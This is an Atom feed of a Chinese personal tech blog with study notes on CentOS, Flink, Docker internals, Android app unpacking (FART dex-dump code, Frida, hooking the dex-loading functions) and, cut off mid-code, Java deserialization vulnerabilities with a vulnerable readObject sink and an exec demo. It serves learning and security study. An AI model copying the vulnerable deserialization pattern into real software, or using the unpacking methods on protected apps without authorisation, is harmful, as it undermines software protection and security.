<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风景这边独好</title>
  
  <subtitle>小风大浪，地狱天堂</subtitle>
  <link href="http://yejuns.github.io/atom.xml" rel="self"/>
  
  <link href="http://yejuns.github.io/"/>
  <updated>2021-09-07T13:13:00.041Z</updated>
  <id>http://yejuns.github.io/</id>
  
  <author>
    <name>Ye-Jun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>问题记录</title>
    <link href="http://yejuns.github.io/2021/09/07/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yejuns.github.io/2021/09/07/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2021-09-07T12:57:22.000Z</published>
    <updated>2021-09-07T13:13:00.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="centos-live版本问题"><a href="#centos-live版本问题" class="headerlink" title="centos live版本问题"></a>centos live版本问题</h2><p>今天在华为的机架服务器上安装centos服务器，引导成功后发现没有安装系统的选项，最后才发现centos的live版本就是让用户在不需要安装情况下，可以正常使用centos，下次下载系统镜像的时候一定要注意。（进入系统后，application下可以选择将系统安装到本地）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;centos-live版本问题&quot;&gt;&lt;a href=&quot;#centos-live版本问题&quot; class=&quot;headerlink&quot; title=&quot;centos live版本问题&quot;&gt;&lt;/a&gt;centos live版本问题&lt;/h2&gt;&lt;p&gt;今天在华为的机架服务器上安装cent</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>flink学习</title>
    <link href="http://yejuns.github.io/2021/09/04/flink%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yejuns.github.io/2021/09/04/flink%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-09-04T10:09:18.000Z</published>
    <updated>2021-09-05T14:10:34.994Z</updated>
    
    <content type="html"><![CDATA[<p>flink是一款非常优秀的分布式流数据流引擎，它以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。常用的数据流处理框架主要是 <strong>stome、spark streaming、flink</strong>，其不同之处在于</p><ul><li>stome：最早的流处理框架、延时低（毫秒级），消息传输过程中可能会重复，吞吐量低</li><li>spark streaming：属于 spark API的扩展，以固定间隔处理一段一段的批处理作业（微批处理），延迟较高（秒级），吞吐量高</li><li>延时低（毫秒级），消息传递过程中不会重复和丢包，高吞吐，支持原生流处理</li></ul><h2 id="flink"><a href="#flink" class="headerlink" title="flink"></a>flink</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;flink是一款非常优秀的分布式流数据流引擎，它以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。常用的数据流处理框架主要是 &lt;strong&gt;stome、spark streaming、flink&lt;/strong&gt;，其不同之处</summary>
      
    
    
    
    
    <category term="大数据" scheme="http://yejuns.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向之FART学习</title>
    <link href="http://yejuns.github.io/2021/08/28/Android%E9%80%86%E5%90%91%E4%B9%8BFART/"/>
    <id>http://yejuns.github.io/2021/08/28/Android%E9%80%86%E5%90%91%E4%B9%8BFART/</id>
    <published>2021-08-28T12:46:06.000Z</published>
    <updated>2021-09-02T07:13:02.917Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android逆向之FART学习"><a href="#Android逆向之FART学习" class="headerlink" title="Android逆向之FART学习"></a>Android逆向之FART学习</h1><p>最近了解到一款很好用的脱壳工具FART，git地址<a href="!https://github.com/hanbinglengyue/FART">在这</a>。</p><p>由于现在的dex加固已经细化到了函数，甚至VMP对每一条指令的保护，通常的dexFile整体dump的方案已经无法脱壳。Dalvik下使用主动调用的自动化脱壳方案可以解决这个问题，相应的框架有<strong>dexhunter</strong>（通过遍历dex中的所有的类，然后进行主动加载初始化）、f8的<strong>Fupk3</strong>（对被抽取的方法进行模拟调用）。但是这些框架都是基于Dalvik,对于不支持Dalvik的App，就无法进行脱壳。</p><p>FART框架主要由三部分组成：</p><ol><li>脱壳组件。对内存中的dexFile进行dump，获取dex文件的一些结构信息</li><li>主动调用组件。获取相关dex函数的指令信息（会对相关函数进行虚拟调用，让壳以为调用了被抽取的方法，从而让壳自己把被加密的代码进行还原）</li><li>修复组件。将结构信息与指令信息整合，从而修复dex</li></ol><h3 id="1、脱壳组件"><a href="#1、脱壳组件" class="headerlink" title="1、脱壳组件"></a>1、脱壳组件</h3><p>安卓系统中存在 DexFile 对象，这个对象包含所需的dex文件信息。我们可以以此为目标进行脱壳点的选择，所以脱壳点是很多的。</p><p>但有些加固产商会hook一些方法，比如C标准库中fopen、fwrite、fread等，修改其逻辑，这样我们在调用的时候，这些方法就不是一个正常的读写逻辑，从而防止进行脱壳，因此FART选择的脱壳点是在 <code>interpreter.cpp</code> 文件中的<code>Execute</code>（解释器的位置，而且是一个 inLine（内联）函数，难以hook这个函数从而修改逻辑）,关键代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  获取到 artmethod</span></span><br><span class="line">ArtMethod* artmethod=shadow_frame.GetMethod();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(artmethod-&gt;PrettyMethod().c_str(),<span class="string">&quot;&lt;clinit&gt;&quot;</span>))&#123;</span><br><span class="line">    <span class="comment">// 通过 artmethod 获取 dexfile</span></span><br><span class="line">    <span class="keyword">const</span> DexFile* dexfile=artmethod-&gt;GetDexFile();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span>* begin=dexfile-&gt;Begin();</span><br><span class="line">    <span class="keyword">size_t</span> size=dexfile-&gt;Size();</span><br><span class="line">    <span class="keyword">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d_Execute.dex&quot;</span>,(<span class="keyword">int</span>)size,getpid());</span><br><span class="line">    <span class="keyword">int</span> fd=open(dexfilepath,O_CREAT|O_RDWR,<span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> number=write(fd,begin,size);</span><br><span class="line">        <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、主动调用组件"><a href="#2、主动调用组件" class="headerlink" title="2、主动调用组件"></a>2、主动调用组件</h3><p>FART要解决的三大问题：</p><p><strong>如何构造主动调用链并让每一个函数都达到主动调用过程，但是又不会影响app的正常运行?</strong></p><p>JNI提供了一系列java层函数与Native层函数交互的接口。当需要在Native层中的c/c++函数中调用位于java层的函数时，需要先获取到该函数的 jmethodid ,然后再通过诸如jni中提供的call开头的一系列函数来完成对java层中函数的调用。</p><ul><li>通过FindClass()得到jcalss；</li><li>通过GetMethodID()得到jmethodID；</li><li>通过一系列Call开头的函数完成调用（如下列中的CallVoidMethod）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FindClass通过 class_linker的FindClass()获取目标类的jclass</span></span><br><span class="line">jclass dpclass = (*env)-&gt;FindClass(env,<span class="string">&quot;cn/itcast/ndkcallback/DataProvider&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(dpclazz==<span class="number">0</span>)&#123;</span><br><span class="line">    LOGI(<span class="string">&quot;find class error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">LOGI(<span class="string">&quot;find class&quot;</span>);</span><br><span class="line"><span class="comment">// GetMethodID根据jclass对象、方法名和签名信息获取对应ARTMethod用于下一步的调用</span></span><br><span class="line">jmethodID method1 = (*env)-&gt;GetMethodID(env,dpclass,<span class="string">&quot;helloFromJava&quot;</span>,<span class="string">&quot;()V&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(method1==<span class="number">0</span>)&#123;</span><br><span class="line">    LOGI(<span class="string">&quot;find method1 error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对方法进行调用</span></span><br><span class="line">(*env)-&gt;CallVoidMethod(env,obj,method1)</span><br></pre></td></tr></table></figure><p>通过这样的方式构造主动调用后，还需要在ArtMethod类中的Invoke方法进行调用的识别，如果是真实的调用方法，要往下继续执行。如果是构造的主动调用，就直接返回，停止继续运行，防止破坏app的正常运行。</p><p><strong>如何根据ArtMethod，定位内存中对应的CodeItem的起始地址?</strong> </p><p>ART下的每一个函数都有ArtMethod对象</p><h3 id="3-修复组件"><a href="#3-修复组件" class="headerlink" title="3. 修复组件"></a>3. 修复组件</h3><p><strong>如何遍历dex中的所有函数并完成主动调用?</strong></p><p>先对dex文件中的所有类进行加载，然后获取dex中的所有类列表。有2种实现方式</p><ol><li>手动解析dex文件</li><li>直接调用源码中已有的api，getClassNameList方法，然后通过反射一步步获取当前ClassLoader中的mCookie</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android逆向之FART学习&quot;&gt;&lt;a href=&quot;#Android逆向之FART学习&quot; class=&quot;headerlink&quot; title=&quot;Android逆向之FART学习&quot;&gt;&lt;/a&gt;Android逆向之FART学习&lt;/h1&gt;&lt;p&gt;最近了解到一款很好用的脱壳工</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>docker基础</title>
    <link href="http://yejuns.github.io/2021/08/25/docker%E5%9F%BA%E7%A1%80/"/>
    <id>http://yejuns.github.io/2021/08/25/docker%E5%9F%BA%E7%A1%80/</id>
    <published>2021-08-25T01:28:43.000Z</published>
    <updated>2021-08-25T02:19:53.743Z</updated>
    
    <content type="html"><![CDATA[<p>容器只是一种特殊的进程，其技术关键点在于 <code>nameSpace + Cgroup + rootfs</code></p><p>一个正在运行的 Docker 容器，其实就是一个启用了多个 Linux Namespace 的应用进程，而这个进程能够使用的资源量，则受 Cgroups 配置的限制。而且<strong>容器是一个“单进程”模型</strong>，用户的应用进程实际上就是容器里 PID=1 的进程，也是其他后续创建的所有进程的父进程。这就意味着，在一个容器中，没办法同时运行两个不同的应用，除非能事先找到一个公共的 PID=1 的程序来充当两个不同应用的父进程。</p><h3 id="1、nameSpace"><a href="#1、nameSpace" class="headerlink" title="1、nameSpace"></a>1、nameSpace</h3><p>当我们在宿主机上运行了一个程序，操作系统都会给它分配一个进程编号，比如 PID=100。这个编号是进程的唯一标识。而namespace技术可以做到让 PID=100 的进程看不到前面的进程，以为自己是1号进程。这种机制，其实是对被隔离应用的进程空间做了手脚，使得这些进程只能看到重新计算过的进程编号。</p><p>而 Namespace 其实只是 Linux 创建新进程的一个可选参数，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过 clone 系统调用创建一个新的进程，并且返回它的进程号 pid。</span></span><br><span class="line"><span class="keyword">int</span> pid = clone(main_function, stack_size, SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 在参数中指定 CLONE_NEWPID参数, ，新创建的这个进程将会“看到”一个全新的进程空间，在这个进程空间里，它的 PID 是 1</span></span><br><span class="line"><span class="keyword">int</span> pid = clone(main_function, stack_size, CLONE_NEWPID | SIGCHLD, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>除了 PID Namespace，Linux 操作系统还提供了 Mount、UTS、IPC、Network 和 User 这些 Namespace, 用来对各种不同的进程上下文进行隔离操作</p><h3 id="2、Cgroup"><a href="#2、Cgroup" class="headerlink" title="2、Cgroup"></a>2、Cgroup</h3><p>Linux Cgroups 最主要的作用，就是限制一个进程组能够使用的资源上限，包括 CPU、内存、磁盘、网络带宽等等。</p><p>在 Linux 中，Cgroups 给用户暴露出来的操作接口是文件系统，即它以文件和目录的方式组织在操作系统的 /sys/fs/cgroup 路径下，使用mount命令可以看到具体内容。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount -t cgroup</span></span><br><span class="line">cpuset on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)</span><br><span class="line">cpu on /sys/fs/cgroup/cpu type cgroup (rw,nosuid,nodev,noexec,relatime,cpu)</span><br><span class="line">cpuacct on /sys/fs/cgroup/cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct)</span><br><span class="line">blkio on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)</span><br><span class="line">memory on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)</span><br></pre></td></tr></table></figure><p>可以看到，在 /sys/fs/cgroup 下面有很多诸如 cpuset、cpu、 memory 这样的子目录。这些都是这台机器当前可以被 Cgroups 进行限制的资源种类。</p><h3 id="3、rootfs"><a href="#3、rootfs" class="headerlink" title="3、rootfs"></a>3、rootfs</h3><p>在 Linux 操作系统里， chroot 命令可以帮助改变进程的根目录到指定的位置。比如现在有一个 <code>$HOME/test</code> 目录，想要把它作为一个 <code>/bin/bash</code> 进程的根目录。</p><p>首先，创建一个 test 目录和几个 lib 文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p $HOME&#x2F;test</span><br><span class="line">$ mkdir -p $HOME&#x2F;test&#x2F;&#123;bin,lib64,lib&#125;</span><br><span class="line">$ cd $T</span><br></pre></td></tr></table></figure><p>然后，把 bash 命令拷贝到 test 目录对应的 bin 路径下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp -v &#x2F;bin&#x2F;&#123;bash,ls&#125; $HOME&#x2F;test&#x2F;bin</span><br></pre></td></tr></table></figure><p>把 bash 命令需要的所有 so 文件，也拷贝到 test 目录对应的 lib 路径下。找到so 文件可以用 ldd 命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ T&#x3D;$HOME&#x2F;test</span><br><span class="line">$ list&#x3D;&quot;$(ldd &#x2F;bin&#x2F;ls | egrep -o &#39;&#x2F;lib.*\.[0-9]&#39;)&quot;</span><br><span class="line">$ for i in $list; do cp -v &quot;$i&quot; &quot;$&#123;T&#125;$&#123;i&#125;&quot;; done</span><br></pre></td></tr></table></figure><p>最后，执行 chroot 命令，告诉操作系统，我们将使用 $HOME/test 目录作为 /bin/bash进程的根目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chroot $HOME&#x2F;test &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>为了能够让容器的这个根目录看起来更“真实”，我们一般会在这个容器的根目录下挂载一个完整操作系统的文件系统，比如 Ubuntu16.04 的 ISO。这样，在容器启动之后，我们在容器里通过执行 “ls /“ 查看根目录下的内容，就是 Ubuntu 16.04 的所有目录和文件。<strong>而这个挂载在容器根目录上、用来为容器进程提供隔离后执行环境的文件系统，就是所谓的“容器镜像”。它还有一个更为专业的名字，叫作：rootfs（根文件系统）。</strong></p><p>需要明确的是，rootfs 只是一个操作系统所包含的文件、配置和目录，并不包括操作系统内核。在 Linux 操作系统中，这两部分是分开存放的，操作系统只有在开机启动时才会加载指定版本的内核镜像。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;容器只是一种特殊的进程，其技术关键点在于 &lt;code&gt;nameSpace + Cgroup + rootfs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;一个正在运行的 Docker 容器，其实就是一个启用了多个 Linux Namespace 的应用进程，而这个进程能够使用的资源量，则受</summary>
      
    
    
    
    
    <category term="docker" scheme="http://yejuns.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向-技巧</title>
    <link href="http://yejuns.github.io/2021/08/13/Android%E9%80%86%E5%90%91%E6%8A%80%E5%B7%A7/"/>
    <id>http://yejuns.github.io/2021/08/13/Android%E9%80%86%E5%90%91%E6%8A%80%E5%B7%A7/</id>
    <published>2021-08-13T02:19:02.000Z</published>
    <updated>2021-08-28T11:58:21.540Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、修改dex文件头模数"><a href="#1、修改dex文件头模数" class="headerlink" title="1、修改dex文件头模数"></a>1、修改dex文件头模数</h3><p>有时候我们获取到了dex文件后，却无法使用 jadx 打开，可能的原因是该dex文件后模数被修改，这时候我们只需要从另一个正常的dex文件中复制出文件头的模数（<code>dex 035</code>），然后复制粘贴到模板dex文件中。（借助 010 editeor）</p><h3 id="2、关于dex2oat"><a href="#2、关于dex2oat" class="headerlink" title="2、关于dex2oat"></a>2、关于dex2oat</h3><p>如果dex2oat对抽取的dex进行编译生成了oat文件，那么动态修改dex中的smali指令流就不会生效。</p><p>所以要是想让动态修改的dex文件生效，有几种办法</p><ul><li>禁用 dex2oat 这个函数</li><li>让还原dex文件的代码早于 dex2oat 函数执行</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1、修改dex文件头模数&quot;&gt;&lt;a href=&quot;#1、修改dex文件头模数&quot; class=&quot;headerlink&quot; title=&quot;1、修改dex文件头模数&quot;&gt;&lt;/a&gt;1、修改dex文件头模数&lt;/h3&gt;&lt;p&gt;有时候我们获取到了dex文件后，却无法使用 jadx 打开，</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向之Frida脱壳</title>
    <link href="http://yejuns.github.io/2021/07/29/Android%E9%80%86%E5%90%91%E4%B9%8BFrida%E8%84%B1%E5%A3%B3/"/>
    <id>http://yejuns.github.io/2021/07/29/Android%E9%80%86%E5%90%91%E4%B9%8BFrida%E8%84%B1%E5%A3%B3/</id>
    <published>2021-07-29T05:07:25.000Z</published>
    <updated>2021-08-29T14:11:23.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android逆向之Frida脱壳"><a href="#Android逆向之Frida脱壳" class="headerlink" title="Android逆向之Frida脱壳"></a>Android逆向之Frida脱壳</h1><p>使用frida脱壳，选择脱壳时机很重要，一些关键的 ClassLoader，比如<code>BootClassLoader</code>加载系统核心库, <code>PathClassLoader</code> 加载APP自身dex</p><h2 id="Fdex2脱壳原理分析"><a href="#Fdex2脱壳原理分析" class="headerlink" title="Fdex2脱壳原理分析"></a>Fdex2脱壳原理分析</h2><p>Fdex2是借助Xposed框架进行脱壳的一款有效工具</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android逆向之Frida脱壳&quot;&gt;&lt;a href=&quot;#Android逆向之Frida脱壳&quot; class=&quot;headerlink&quot; title=&quot;Android逆向之Frida脱壳&quot;&gt;&lt;/a&gt;Android逆向之Frida脱壳&lt;/h1&gt;&lt;p&gt;使用frida脱壳，</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向-Dalvik和ART下dex加载流程</title>
    <link href="http://yejuns.github.io/2021/07/27/Android%E9%80%86%E5%90%91-%E5%85%B3%E4%BA%8EDalvik%E5%92%8CART/"/>
    <id>http://yejuns.github.io/2021/07/27/Android%E9%80%86%E5%90%91-%E5%85%B3%E4%BA%8EDalvik%E5%92%8CART/</id>
    <published>2021-07-27T07:47:03.000Z</published>
    <updated>2021-08-30T03:12:41.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h2><h3 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h3><p>JVM，即Java虚拟机，将.class文件编译成.java文件</p><h3 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h3><p>Dalvik虚拟机在JVM上做了改进，以适应低内存，低处理器速度的移动设备环境。</p><p>Android中的所有Java程序都是运行在DVM上的，每个Android应用进程对应着一个独立的Dalvik虚拟机实例并在其解释下执行。DVM没有遵循Java虚拟机规范，不能直接执行Java的.class文件，而是执行.dex文件。它使用的是寄存器架构而不是JVM中常见的栈架构。其中.dex（Dalvik Executable）文件是通过.class文件转化而来</p><h3 id="ART"><a href="#ART" class="headerlink" title="ART"></a>ART</h3><p>ART(Android Runtime)是Android 4.4发布的，用来替换Dalvik虚拟，Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART。</p><p>Dalvik是依靠一个Just-In-Time(JIT)编译器去解释字节码，运行时编译后的应用代码都需要通过一个解释器在用户的设备上运行，这一机制并不高效，但让应用能更容易在不同硬件和架构上运行。而ART完全改变了这种做法，在应用安装的时候就预编译字节码到机器语言，这一机制叫Ahead-Of-Time(AOT)预编译。在移除解释代码这一过程后，应用程序执行将更有效率，启动更快。需要借助<code>dex2oat</code>方法</p><p>因此，ART下函数有2种执行模式：</p><ol><li>interpreter模式：由ART下的解释器解释执行</li><li>quick模式，直接运行dex2oat编译生成的arm指令</li></ol><h2 id="2、Dalvik下dex加载流程"><a href="#2、Dalvik下dex加载流程" class="headerlink" title="2、Dalvik下dex加载流程"></a>2、Dalvik下dex加载流程</h2><p>我们在分析dex的加载流程时，最有效的方法就是根据源代码进行分析，可以在<a href="http://androidxref.com/">这里</a>查看相关代码，由于Dalvik在安卓5.0以后就不存在了，因此我们选择5.0以前的版本进行查看。</p><p>Dalvik是通过<strong>DexClassLoader</strong>加载dex源码，因此我们在 <code>androidxref.com</code>上进行检索，该文件在<strong>libcore</strong>包下，可以看到其代码非常简单，就只有一个构造方法。这4个参数分别是要加载的dex文件的路径、优化的odex文件的存储位置、要加载的so文件的位置，以及父classLoader</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DexClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DexClassLoader</span><span class="params">(String dexPath, String optimizedDirectory,String libraryPath, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(dexPath, <span class="keyword">new</span> File(optimizedDirectory), libraryPath, parent);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们可以继续跟踪，进行分析。最终看到dex文件是以code_item的smali指令流的形式存在。</p><p>整个dex加载过程中， <code>dexFileParse</code>和<code>dvmDexFileOpenPartial</code> 这两个函数是通用脱壳点，常用的方法就是对这两个方法进行hook，将dex文件保存下来，这里以 dvmDexFileOpenPartial 为例进行修改</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/dexFile-1.png"></p><p>修改以后，我们需要对安卓源代码进行编译，然后写入到手机上。只要app在机器上运行，就可以在对应的位置获取到 dex 文件。</p><h2 id="3、ART下dex加载流程"><a href="#3、ART下dex加载流程" class="headerlink" title="3、ART下dex加载流程"></a>3、ART下dex加载流程</h2><p>在ART下追踪 <code>dexClassLoader</code> 方法，可以进行脱壳的方法有</p><ul><li><p>openAndReadMagic(filename, &amp;magic,error_msg)</p></li><li><p>DexFile::OpenCommon()</p></li><li><p>DexFile::DexFile()</p><p><code>dexClassLoader</code> 方法在调用过程中，最后会调用dex2oat方法</p></li></ul><p>在安卓8.0以后，有时候会使用<code>InMemoryDexClassLoader</code>方法进行dex文件的加载。同样地，可以在 <code>androidxref.com</code>追踪方法的调用过程。在整个调用过程中，出现 dexFile 的起始地址的函数有</p><ul><li><code>CreateSingleDexFileCookie(JNIEnv* env, std::unique_ptr&lt;MemMap&gt; data)</code></li><li><code>CreateDexFile(JNIEnv* env, std::unique_ptr&lt;MemMap&gt; dex_mem_map)</code></li><li><code>DexFile::open()</code></li><li><code>OpenCommon()</code></li><li><code>DexFile::DexFile()</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、预备知识&quot;&gt;&lt;a href=&quot;#1、预备知识&quot; class=&quot;headerlink&quot; title=&quot;1、预备知识&quot;&gt;&lt;/a&gt;1、预备知识&lt;/h2&gt;&lt;h3 id=&quot;JVM&quot;&gt;&lt;a href=&quot;#JVM&quot; class=&quot;headerlink&quot; title=&quot;JVM</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>web安全之反序列化漏洞-java</title>
    <link href="http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/"/>
    <id>http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/</id>
    <published>2021-06-14T08:01:51.000Z</published>
    <updated>2021-09-14T08:25:38.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-java序列化与反序列化"><a href="#1-java序列化与反序列化" class="headerlink" title="1.java序列化与反序列化"></a>1.java序列化与反序列化</h2><p>在Java中，只要一个类实现了<code>java.io.Serializable</code>接口，那么它就可以通过 <code>ObjectInputStream</code> 与 <code>ObejctOutputStream</code> 序列化。第三方的包包括 commons-collections、commons-fileupload。</p><p>当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取输入流,并转换对象</span></span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure><p>暴露或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以构造反序列化对象并执行恶意代码，<strong>常用的方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><ol><li>java方法重写，如果一个父类的方法被子类重写，那么调用子类重写的方法；</li><li>java反射，在运行时可以根据对象获取相关类信息；</li></ol><h3 id="2-1-反射进行命令执行"><a href="#2-1-反射进行命令执行" class="headerlink" title="2.1 反射进行命令执行"></a>2.1 反射进行命令执行</h3><p>java中执行系统命令的方法是 <strong>Runtime.getRuntime().exec()</strong></p><p>正常的步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    runtime.exec(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应的反射代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 